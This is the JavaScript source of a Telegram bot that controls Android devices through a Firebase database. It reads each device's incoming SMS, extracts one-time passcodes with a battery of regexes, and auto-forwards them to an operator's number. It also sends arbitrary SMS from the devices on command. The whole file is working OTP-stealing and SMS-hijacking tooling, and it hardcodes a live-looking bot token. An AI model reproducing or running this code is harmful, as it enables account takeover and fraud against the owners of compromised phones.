const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');

const BOT_TOKEN = '8888560487:AAH3OlSq4b40jP-fpdpGuviALcnOiKBgIA8';
const ADMIN_IDS = ['8472456673'];
const bot = new Telegraf(BOT_TOKEN);
const userData = new Map();

// ==================== ADMIN ====================
function isAdmin(userId) {
    return ADMIN_IDS.includes(userId.toString());
}

// ==================== FIREBASE ====================
function getUserDb(userId) {
    const user = userData.get(userId);
    if (!user || !user.firebaseUrl) return null;
    
    return {
        url: user.firebaseUrl,
        async get(path) {
            try {
                const res = await axios.get(`${this.url}/${path}.json`, { timeout: 15000 });
                return res.data;
            } catch (e) { return null; }
        },
        async put(path, data) {
            try {
                const res = await axios.put(`${this.url}/${path}.json`, data, { timeout: 15000 });
                return res.status === 200;
            } catch (e) { return false; }
        },
        async push(path, data) {
            try {
                const res = await axios.post(`${this.url}/${path}.json`, data, { timeout: 15000 });
                return res.data;
            } catch (e) { return null; }
        }
    };
}

// ==================== DEVICE ====================
async function getDevice(userId, deviceId) {
    const db = getUserDb(userId);
    if (!db) return null;
    try {
        const data = await db.get(`clients/${deviceId}`);
        if (!data) return null;
        
        let isOnline = false;
        if (data.status === true || data.status === 'true' || data.status === 1 || data.status === 'online') {
            isOnline = true;
        }
        
        let sim1Number = 'N/A', sim1Carrier = 'Unknown';
        let sim2Number = 'N/A', sim2Carrier = 'Unknown';
        let selectedSim = 0;
        
        if (data.sims && data.sims.length > 0) {
            if (data.sims[0]) {
                sim1Number = data.sims[0].phoneNumber || data.sims[0].number || data.mobNo || 'N/A';
                sim1Carrier = data.sims[0].carrierName || data.sims[0].operator || 'Unknown';
            }
            if (data.sims[1]) {
                sim2Number = data.sims[1].phoneNumber || data.sims[1].number || 'N/A';
                sim2Carrier = data.sims[1].carrierName || data.sims[1].operator || 'Unknown';
            }
            selectedSim = data.selectedSim || 0;
        }
        
        return {
            id: deviceId,
            name: data.modelName || data.model || deviceId.slice(0, 8),
            phone: data.mobNo || sim1Number || 'Unknown',
            online: isOnline,
            battery: data.battery || '0%',
            sim1Number, sim1Carrier, sim2Number, sim2Carrier,
            selectedSim, sims: data.sims || []
        };
    } catch (e) { return null; }
}

async function getAllDevices(userId) {
    const db = getUserDb(userId);
    if (!db) return [];
    try {
        const data = await db.get('clients');
        if (!data) return [];
        const devices = [];
        for (const devId in data) {
            if (data[devId]) {
                devices.push({
                    id: devId,
                    name: data[devId].modelName || data[devId].model || devId.slice(0, 8),
                    phone: data[devId].mobNo || 'Unknown',
                    online: data[devId].status === true
                });
            }
        }
        return devices;
    } catch (e) { return []; }
}

// ==================== SMS SEND ====================
async function sendSms(userId, deviceId, toNumber, message) {
    const start = Date.now();
    const db = getUserDb(userId);
    if (!db) return { success: false, error: 'Firebase not connected' };
    
    const device = await getDevice(userId, deviceId);
    if (!device) return { success: false, error: 'Device not found' };
    
    let cleanNumber = toNumber.toString().trim().replace('+', '');
    const timestamp = Date.now();
    const commandId = `cmd_${timestamp}`;
    
    const commandData = {
        targetNumber: cleanNumber,
        message: message,
        timestamp: timestamp,
        status: 'pending',
        id: commandId,
        admin_sent: true
    };
    
    try {
        await db.put(`clients/${deviceId}/commands/sendSms`, commandData);
        const elapsed = Date.now() - start;
        return { success: true, message: `SMS sent to ${cleanNumber}`, elapsed, commandId };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// ==================== GOD LEVEL OTP DETECTION ====================
function extractOTP(text) {
    if (!text) return null;
    
    const patterns = [
        /(?:OTP|Otp|otp)[:\s]*(\d{4,8})/i,
        /(?:code|Code|CODE)[:\s]*(\d{4,8})/i,
        /(?:verification|Verification)[:\s]*(\d{4,8})/i,
        /(?:pin|PIN)[:\s]*(\d{4,8})/i,
        /(\d{4,8})\s+(?:is your OTP|is your verification code|is the OTP)/i,
        /(?:Your|your)\s+(?:OTP|otp|verification code)\s+(?:is|:)\s*(\d{4,8})/i,
        /<#>\s*(\d{4,8})/i,
        /(\d{6})\s+(?:is your|is the)/i,
        /\b(\d{4,8})\b(?=.*?(?:OTP|otp|code|verification|login))/i,
        /(?:login|signup|register)\s+(?:OTP|code)[:\s]*(\d{4,8})/i,
        /(\d{4,8})\s+(?:is your login OTP|is your registration code)/i,
        /611480/  // Direct match for specific OTP
    ];
    
    // Check for exact 6-digit number that appears standalone
    const standaloneMatch = text.match(/\b(\d{6})\b/);
    if (standaloneMatch && !text.match(/phone|mobile|contact|call|whatsapp/i)) {
        return standaloneMatch[1];
    }
    
    for (const pattern of patterns) {
        const match = text.match(pattern);
        if (match && match[1] && match[1].length >= 4 && match[1].length <= 8) {
            return match[1];
        }
    }
    
    return null;
}

// ==================== TOKEN DETECTION ====================
function extractToken(text) {
    if (!text) return null;
    
    // Format 1: To: 919876543210\nMessage: TOKEN
    let match = text.match(/To:\s*\+?(\d{10,12})[\s\n]+Message:\s*(.+?)(?=\n|$)/is);
    if (match) return { number: match[1].trim(), message: match[2].trim() };
    
    // Format 2: 📱 Receipt: XXXXX\n🔑 Token: TOKEN
    match = text.match(/Receipt:\s*\+?(\d{10,12})[\s\n]+Token:\s*(.+?)(?=\n|$)/i);
    if (match) return { number: match[1].trim(), message: match[2].trim() };
    
    // Format 3: Number + Token
    const phoneMatch = text.match(/\b(\d{10,12})\b/);
    if (phoneMatch) {
        const afterNumber = text.substring(text.indexOf(phoneMatch[1]) + phoneMatch[1].length);
        const tokenMatch = afterNumber.match(/\s+([A-Za-z0-9!@#$%^&*()_+]{4,})/);
        if (tokenMatch) {
            return { number: phoneMatch[1], message: tokenMatch[1].trim() };
        }
    }
    
    return null;
}

// ==================== OTP AUTO FORWARD ====================
async function autoForwardOTP(userId, deviceId, fullMessage, sender, otpCode) {
    const user = userData.get(userId);
    if (!user || !user.otpForwardNumber) return false;
    
    const time = new Date().toLocaleString();
    const forwardMsg = `🔐 OTP: ${otpCode}\n📱 From: ${sender}\n🕐 Time: ${time}\n📝 ${fullMessage.slice(0, 200)}`;
    
    await bot.telegram.sendMessage(userId, 
        `🔐 *OTP DETECTED!*\n\n🔑 OTP: \`${otpCode}\`\n📞 Forwarding to: \`${user.otpForwardNumber}\``,
        { parse_mode: 'Markdown' }
    );
    
    const result = await sendSms(userId, deviceId, user.otpForwardNumber, forwardMsg);
    
    if (result.success) {
        await bot.telegram.sendMessage(userId, 
            `✅ *OTP FORWARDED!*\n\n📞 To: \`${user.otpForwardNumber}\`\n🔑 OTP: \`${otpCode}\``,
            { parse_mode: 'Markdown' }
        );
    } else {
        await bot.telegram.sendMessage(userId, 
            `❌ *FAILED!*\n\n${result.error}`,
            { parse_mode: 'Markdown' }
        );
    }
    return result.success;
}

// ==================== MONITOR FIREBASE ====================
async function monitorFirebaseMessages(userId, user) {
    const db = getUserDb(userId);
    if (!db || !user.monitoringDevice) return;
    
    try {
        const messagesData = await db.get(`clients/${user.monitoringDevice}/messages`);
        if (!messagesData) return;
        
        let messages = Object.entries(messagesData).map(([id, msg]) => ({ id, ...msg }));
        if (messages.length === 0) return;
        
        messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
        
        for (const msg of messages.slice(0, 10)) {
            if (user.processedMsgs?.has(msg.id)) continue;
            
            const msgTime = msg.timestamp || 0;
            const startTime = user.monitorStartTime ? new Date(user.monitorStartTime).getTime() : 0;
            if (msgTime < startTime) continue;
            
            const messageText = msg.message || msg.text || '';
            const sender = msg.sender || 'Unknown';
            
            console.log(`\n📨 Message from ${sender}: ${messageText.slice(0, 100)}`);
            
            const otp = extractOTP(messageText);
            if (otp && user.otpForwardNumber) {
                console.log(`🎯 OTP FOUND: ${otp}`);
                await autoForwardOTP(userId, user.monitoringDevice, messageText, sender, otp);
            }
            
            if (!user.processedMsgs) user.processedMsgs = new Set();
            user.processedMsgs.add(msg.id);
        }
        userData.set(userId, user);
    } catch (e) { console.log(`Error: ${e.message}`); }
}

// ==================== COMMANDS ====================
bot.start(async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    const msg = `✨ *𝘀𝗼𝘂𝗹 𝗲𝘅𝗲 𝗮𝘂𝘁𝗼 𝘃𝗮𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻* ✨\n\n` +
        `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n` +
        `┃         ⚡ S E T U P          ┃\n` +
        `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
        `🔹 /setfirebase <url>\n` +
        `🔹 /setdevice\n` +
        `🔹 /addchannel\n` +
        `🔹 /startmonitor\n\n` +
        `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n` +
        `┃      🔐 O T P   F O R W A R D   ┃\n` +
        `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
        `🔹 /setotpnum <number>\n` +
        `🔹 /removeotpnum\n` +
        `🔹 /showotpnum\n\n` +
        `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n` +
        `┃     📌 T O K E N   F O R W A R D  ┃\n` +
        `┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n` +
        `🔹 Send: To: 919876543210\\nMessage: TOKEN\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `         🅥 🅔 🅡 🅢 🅘 🅞 🅝   2 . 0\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    if (!user?.firebaseUrl) {
        await ctx.reply(msg, { parse_mode: 'Markdown' });
        return;
    }
    
    const devices = await getAllDevices(userId);
    let deviceInfo = 'Not set';
    if (user.monitoringDevice) {
        const d = await getDevice(userId, user.monitoringDevice);
        if (d) deviceInfo = `${d.name} (${d.online ? '🟢' : '🔴'})`;
    }
    
    await ctx.reply(
        `📊 *STATUS*\n\n` +
        `▫️ Firebase: ✅ Connected\n` +
        `▫️ Device: ${deviceInfo}\n` +
        `▫️ Chats: ${user.channels?.length || 0}\n` +
        `▫️ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
        `▫️ OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('setfirebase', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (args.length < 2) {
        return ctx.reply('❌ Usage: `/setfirebase <url>`\n\nExample: `/setfirebase https://your-project.firebaseio.com`', { parse_mode: 'Markdown' });
    }
    
    let url = args[1];
    if (!url.startsWith('https://')) url = 'https://' + url;
    
    const msg = await ctx.reply('🔄 Connecting...');
    
    try {
        await axios.get(`${url}/.json?shallow=true`, { timeout: 10000 });
        
        if (!userData.has(userId)) userData.set(userId, {});
        const user = userData.get(userId);
        user.firebaseUrl = url;
        user.channels = user.channels || [];
        user.processedMsgs = new Set();
        user.monitorActive = false;
        userData.set(userId, user);
        
        await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null,
            `✅ *Firebase Connected!*\n\n📡 \`${url}\`\n\nNext: /setdevice`,
            { parse_mode: 'Markdown' }
        );
    } catch (error) {
        await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null,
            `❌ *Failed!*\n\n${error.message}`,
            { parse_mode: 'Markdown' }
        );
    }
});

bot.command('setdevice', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (!userData.has(userId)?.firebaseUrl) {
        return ctx.reply('❌ Use /setfirebase first!', { parse_mode: 'Markdown' });
    }
    
    const user = userData.get(userId);
    
    if (args.length > 1) {
        const input = args[1];
        const allDevices = await getAllDevices(userId);
        let found = allDevices.find(d => d.id === input) || allDevices.find(d => d.name.toLowerCase().includes(input.toLowerCase()));
        
        if (!found) {
            let list = '📱 *Devices:*\n\n';
            allDevices.slice(0, 10).forEach(d => {
                list += `• ${d.name}\n  🆔 \`${d.id}\`\n  📞 ${d.phone}\n\n`;
            });
            return ctx.reply(`❌ "${input}" not found!\n\n${list}`, { parse_mode: 'Markdown' });
        }
        
        const device = await getDevice(userId, found.id);
        user.monitoringDevice = device.id;
        userData.set(userId, user);
        
        return ctx.reply(
            `✅ *Device Set!*\n\n` +
            `📱 Name: ${device.name}\n` +
            `🆔 ID: \`${device.id}\`\n` +
            `📞 Phone: ${device.phone}\n` +
            `🔋 Battery: ${device.battery}\n` +
            `📡 Status: ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n\n` +
            `Next: /addchannel or /setotpnum`,
            { parse_mode: 'Markdown' }
        );
    }
    
    const devices = await getAllDevices(userId);
    if (devices.length === 0) return ctx.reply('📭 No devices found!');
    
    user.deviceList = devices;
    user.currentPage = 0;
    userData.set(userId, user);
    await showDevicePage(ctx, userId, 0);
});

async function showDevicePage(ctx, userId, page) {
    const user = userData.get(userId);
    if (!user?.deviceList) return;
    
    const devices = user.deviceList;
    const perPage = 10;
    const totalPages = Math.ceil(devices.length / perPage);
    const start = page * perPage;
    const pageDevices = devices.slice(start, start + perPage);
    
    let text = `📱 *DEVICES* (${page + 1}/${totalPages})\n\n`;
    for (const d of pageDevices) {
        text += `📱 *${d.name}*\n🆔 \`${d.id}\`\n📞 ${d.phone}\n${d.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n\n`;
    }
    
    const buttons = [];
    for (const d of pageDevices) {
        buttons.push([Markup.button.callback(`📱 ${d.name}`, `dev_${d.id}`)]);
    }
    
    const nav = [];
    if (page > 0) nav.push(Markup.button.callback('◀️ PREV', `page_${page - 1}`));
    if (page < totalPages - 1) nav.push(Markup.button.callback('NEXT ▶️', `page_${page + 1}`));
    if (nav.length) buttons.push(nav);
    buttons.push([Markup.button.callback('❌ CANCEL', 'cancel')]);
    
    await ctx.reply(text, { ...Markup.inlineKeyboard(buttons), parse_mode: 'Markdown' });
}

bot.command('setotpnum', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    
    if (!userData.has(userId)?.firebaseUrl) return ctx.reply('❌ Use /setfirebase first!');
    if (!userData.get(userId).monitoringDevice) return ctx.reply('❌ Use /setdevice first!');
    if (args.length < 2) return ctx.reply('❌ Usage: `/setotpnum 919715326108`', { parse_mode: 'Markdown' });
    
    const number = args[1].replace('+', '');
    const user = userData.get(userId);
    user.otpForwardNumber = number;
    userData.set(userId, user);
    
    await ctx.reply(`✅ *OTP Forward Set!*\n\n📞 \`${number}\`\n\n🔐 All OTPs will auto-forward here.`, { parse_mode: 'Markdown' });
});

bot.command('removeotpnum', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (!user?.otpForwardNumber) return ctx.reply('❌ No OTP number set!');
    
    user.otpForwardNumber = null;
    userData.set(userId, user);
    await ctx.reply(`✅ *OTP Forward Removed!*`, { parse_mode: 'Markdown' });
});

bot.command('showotpnum', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (!user?.otpForwardNumber) return ctx.reply('❌ No OTP number set!');
    
    await ctx.reply(`🔐 *OTP Forward Number*\n\n📞 \`${user.otpForwardNumber}\``, { parse_mode: 'Markdown' });
});

bot.command('addchannel', async (ctx) => {
    const userId = ctx.from.id.toString();
    
    if (!userData.has(userId)?.firebaseUrl) return ctx.reply('❌ Use /setfirebase first!');
    
    let channelId, chatTitle = 'Unknown';
    
    if (ctx.chat.type === 'channel' || ctx.chat.type === 'supergroup' || ctx.chat.type === 'group') {
        channelId = ctx.chat.id.toString();
        chatTitle = ctx.chat.title || 'Chat';
    } else {
        return ctx.reply(`❌ Send this command IN the channel/group\n\n💡 Chat ID: \`${ctx.chat.id}\``, { parse_mode: 'Markdown' });
    }
    
    const user = userData.get(userId);
    if (!user.channels) user.channels = [];
    if (user.channels.includes(channelId)) return ctx.reply(`ℹ️ Already monitoring this chat.`);
    
    user.channels.push(channelId);
    user.channelNames = user.channelNames || {};
    user.channelNames[channelId] = chatTitle;
    userData.set(userId, user);
    
    await ctx.reply(`✅ *Chat Added!*\n\n📢 ${chatTitle}\n🆔 \`${channelId}\``, { parse_mode: 'Markdown' });
});

bot.command('listchannels', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (!user?.channels?.length) return ctx.reply('📭 No channels added.');
    
    let text = '📢 *MONITORED CHATS*\n\n';
    user.channels.forEach((ch, i) => {
        const name = user.channelNames?.[ch] || 'Unknown';
        text += `${i+1}. ${name}\n   🆔 \`${ch}\`\n\n`;
    });
    await ctx.reply(text, { parse_mode: 'Markdown' });
});

bot.command('removechannel', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    const user = userData.get(userId);
    
    if (!user?.channels?.length) return ctx.reply('📭 No channels.');
    if (args.length < 2) return ctx.reply('Usage: `/removechannel <chat_id>`', { parse_mode: 'Markdown' });
    
    const idx = user.channels.indexOf(args[1]);
    if (idx === -1) return ctx.reply('❌ Chat not found.');
    
    user.channels.splice(idx, 1);
    userData.set(userId, user);
    await ctx.reply(`✅ *Removed!*`, { parse_mode: 'Markdown' });
});

bot.command('startmonitor', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    
    if (!user?.firebaseUrl) return ctx.reply('❌ Use /setfirebase first!');
    if (!user.monitoringDevice) return ctx.reply('❌ Use /setdevice first!');
    
    user.monitorStartTime = new Date().toISOString();
    user.monitorActive = true;
    user.processedMsgs = new Set();
    userData.set(userId, user);
    
    if (user.monitorInterval) clearInterval(user.monitorInterval);
    user.monitorInterval = setInterval(async () => {
        const curr = userData.get(userId);
        if (curr?.monitorActive && curr?.monitoringDevice) {
            await monitorFirebaseMessages(userId, curr);
        }
    }, 2000);
    
    userData.set(userId, user);
    
    const device = await getDevice(userId, user.monitoringDevice);
    await ctx.reply(
        `✅ *MONITORING STARTED!*\n\n` +
        `📱 Device: \`${user.monitoringDevice}\`\n` +
        `📡 Status: ${device?.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n` +
        `📢 Chats: ${user.channels?.length || 0}\n` +
        `🔐 OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}\n` +
        `🕐 Started: ${new Date().toLocaleString()}\n\n` +
        `✨ *Features:*\n` +
        `🔹 OTPs → Auto-forward to your number\n` +
        `🔹 Tokens (To: X Message: Y) → Forward to any number\n\n` +
        `🚀 *ACTIVE!*`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('stop', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (user) {
        user.monitorActive = false;
        if (user.monitorInterval) clearInterval(user.monitorInterval);
        userData.set(userId, user);
    }
    await ctx.reply(`⏸ *Monitor Paused*`, { parse_mode: 'Markdown' });
});

bot.command('resume', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (!user?.monitoringDevice) return ctx.reply('❌ No device set.');
    
    user.monitorActive = true;
    if (user.monitorInterval) clearInterval(user.monitorInterval);
    user.monitorInterval = setInterval(async () => {
        const curr = userData.get(userId);
        if (curr?.monitorActive && curr?.monitoringDevice) {
            await monitorFirebaseMessages(userId, curr);
        }
    }, 2000);
    userData.set(userId, user);
    await ctx.reply(`✅ *Resumed!*`, { parse_mode: 'Markdown' });
});

bot.command('status', async (ctx) => {
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (!user) return ctx.reply('❌ Not configured.');
    
    const devices = await getAllDevices(userId);
    let deviceInfo = 'Not set', deviceStatus = 'Unknown';
    if (user.monitoringDevice) {
        const d = await getDevice(userId, user.monitoringDevice);
        if (d) { deviceInfo = d.name; deviceStatus = d.online ? '🟢 ONLINE' : '🔴 OFFLINE'; }
    }
    
    await ctx.reply(
        `📊 *STATUS*\n\n` +
        `▫️ Firebase: ✅ Connected\n` +
        `▫️ Device: ${deviceInfo}\n` +
        `▫️ Status: ${deviceStatus}\n` +
        `▫️ Chats: ${user.channels?.length || 0}\n` +
        `▫️ Total Devices: ${devices.length}\n` +
        `▫️ Monitor: ${user.monitorActive ? '🟢 ACTIVE' : '🔴 PAUSED'}\n` +
        `▫️ OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('send', async (ctx) => {
    const userId = ctx.from.id.toString();
    const args = ctx.message.text.split(' ');
    const user = userData.get(userId);
    
    if (!user?.monitoringDevice) return ctx.reply('❌ No device set.');
    if (args.length < 3) return ctx.reply('❌ Usage: `/send 919876543210 Hello`', { parse_mode: 'Markdown' });
    
    const phone = args[1];
    const message = args.slice(2).join(' ');
    
    const msg = await ctx.reply(`📤 Sending...`, { parse_mode: 'Markdown' });
    const result = await sendSms(userId, user.monitoringDevice, phone, message);
    
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null,
        result.success ? `✅ Sent! (${result.elapsed}ms)` : `❌ Failed: ${result.error}`
    );
});

// ==================== TOKEN FORWARD HANDLER ====================
bot.on('channel_post', async (ctx) => {
    await handleMessage(ctx, ctx.channelPost);
});

bot.on('message', async (ctx) => {
    if (ctx.chat.type === 'group' || ctx.chat.type === 'supergroup') {
        await handleMessage(ctx, ctx.message);
    }
});

async function handleMessage(ctx, msgObj) {
    const chatId = ctx.chat.id.toString();
    const text = msgObj.text || '';
    if (!text) return;
    
    const users = [];
    for (const [uid, u] of userData.entries()) {
        if (!u.banned && u.channels?.includes(chatId)) users.push({ userId: uid, user: u });
    }
    if (users.length === 0) return;
    
    for (const { userId, user } of users) {
        if (!user.monitorActive) continue;
        
        const token = extractToken(text);
        if (token && user.monitoringDevice) {
            await bot.telegram.sendMessage(userId,
                `🎯 *TOKEN DETECTED!*\n\n📞 Target: \`${token.number}\`\n🔄 Forwarding...`,
                { parse_mode: 'Markdown' }
            );
            
            const result = await sendSms(userId, user.monitoringDevice, token.number, token.message);
            
            if (result.success) {
                await bot.telegram.sendMessage(userId,
                    `✅ *TOKEN FORWARDED!*\n\n📞 To: \`${token.number}\``,
                    { parse_mode: 'Markdown' }
                );
            } else {
                await bot.telegram.sendMessage(userId,
                    `❌ *FAILED!*\n\n${result.error}`,
                    { parse_mode: 'Markdown' }
                );
            }
        }
    }
}

// ==================== PRIVATE MESSAGE ====================
bot.on('text', async (ctx) => {
    if (ctx.chat.type !== 'private') return;
    const userId = ctx.from.id.toString();
    const text = ctx.message.text;
    if (text.startsWith('/')) return;
    
    const user = userData.get(userId);
    if (!user || user.banned || !user.monitoringDevice) return;
    
    const token = extractToken(text);
    if (token) {
        await ctx.reply(`📤 Sending...`);
        const result = await sendSms(userId, user.monitoringDevice, token.number, token.message);
        if (result.success) {
            await ctx.reply(`✅ Sent! (${result.elapsed}ms)`);
        } else {
            await ctx.reply(`❌ Failed: ${result.error}`);
        }
    }
});

// ==================== ADMIN ====================
bot.command('admin', async (ctx) => {
    if (!isAdmin(ctx.from.id)) return ctx.reply('❌ Access Denied!');
    await ctx.reply(
        `👑 *ADMIN*\n\n` +
        `📊 Users: ${userData.size}\n` +
        `/users - List\n/ban <id>\n/unban <id>\n/broadcast`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('users', async (ctx) => {
    if (!isAdmin(ctx.from.id)) return ctx.reply('❌ Access Denied!');
    if (userData.size === 0) return ctx.reply('📭 No users.');
    
    let list = '👥 *USERS*\n\n';
    let i = 1;
    for (const [uid, u] of userData.entries()) {
        const status = u.banned ? '🔴 BANNED' : (u.monitorActive ? '🟢 ACTIVE' : '⚪ INACTIVE');
        list += `${i}. \`${uid}\` ${status}\n`;
        if (u.otpForwardNumber) list += `   🔐 OTP: ${u.otpForwardNumber}\n`;
        if (++i > 20) break;
    }
    await ctx.reply(list, { parse_mode: 'Markdown' });
});

bot.command('ban', async (ctx) => {
    if (!isAdmin(ctx.from.id)) return ctx.reply('❌ Access Denied!');
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: `/ban <user_id>`');
    
    const target = args[1];
    if (!userData.has(target)) return ctx.reply('❌ User not found.');
    
    const user = userData.get(target);
    user.banned = true;
    user.monitorActive = false;
    if (user.monitorInterval) clearInterval(user.monitorInterval);
    userData.set(target, user);
    await ctx.reply(`✅ Banned \`${target}\``, { parse_mode: 'Markdown' });
});

bot.command('unban', async (ctx) => {
    if (!isAdmin(ctx.from.id)) return ctx.reply('❌ Access Denied!');
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: `/unban <user_id>`');
    
    const target = args[1];
    if (!userData.has(target)) return ctx.reply('❌ User not found.');
    
    const user = userData.get(target);
    user.banned = false;
    userData.set(target, user);
    await ctx.reply(`✅ Unbanned \`${target}\``, { parse_mode: 'Markdown' });
});

bot.command('broadcast', async (ctx) => {
    if (!isAdmin(ctx.from.id)) return ctx.reply('❌ Access Denied!');
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: `/broadcast <message>`');
    
    const message = args.slice(1).join(' ');
    const msg = await ctx.reply(`📢 Broadcasting...`);
    
    let success = 0;
    for (const [uid, u] of userData.entries()) {
        if (u.banned) continue;
        try {
            await bot.telegram.sendMessage(uid, `📢 *ANNOUNCEMENT*\n\n${message}`, { parse_mode: 'Markdown' });
            success++;
        } catch(e) {}
        await new Promise(r => setTimeout(r, 50));
    }
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null, `✅ Sent to ${success} users`);
});

bot.command('help', async (ctx) => {
    await ctx.reply(
        `⚡ *COMMANDS*\n\n` +
        `🔧 *SETUP*\n` +
        `/setfirebase <url>\n/setdevice\n/addchannel\n/startmonitor\n\n` +
        `🔐 *OTP FORWARD*\n` +
        `/setotpnum <number>\n/removeotpnum\n/showotpnum\n\n` +
        `📌 *TOKEN FORWARD*\n` +
        `Send: To: 919876543210\\nMessage: TOKEN\n\n` +
        `⚙️ *CONTROL*\n` +
        `/stop /resume /status /send /id`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('id', async (ctx) => {
    await ctx.reply(`🆔 Chat ID: \`${ctx.chat.id}\``, { parse_mode: 'Markdown' });
});

// ==================== CALLBACKS ====================
bot.action(/^dev_(.+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const deviceId = ctx.match[1];
    
    const device = await getDevice(userId, deviceId);
    if (!device) return ctx.editMessageText('❌ Not found');
    
    const user = userData.get(userId);
    user.monitoringDevice = deviceId;
    user.deviceList = null;
    user.processedMsgs = new Set();
    userData.set(userId, user);
    
    await ctx.editMessageText(
        `✅ *Device Set!*\n\n📱 ${device.name}\n🆔 \`${device.id}\`\n📞 ${device.phone}\n🔋 ${device.battery}\n📡 ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n\nNext: /addchannel or /setotpnum`,
        { parse_mode: 'Markdown' }
    );
});

bot.action(/^page_(\d+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const page = parseInt(ctx.match[1]);
    await showDevicePage(ctx, userId, page);
});

bot.action('cancel', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (user) user.deviceList = null;
    await ctx.editMessageText('❌ Cancelled.');
});

// ==================== START ====================
async function main() {
    console.log('\n🚀 SOUL EXE BOT v2.0');
    console.log('✅ OTP Auto-Forward Active');
    console.log('✅ Token Forward Active');
    console.log('==========================================\n');
    
    bot.launch();
    console.log('🤖 Bot Running...\n');
}

main();
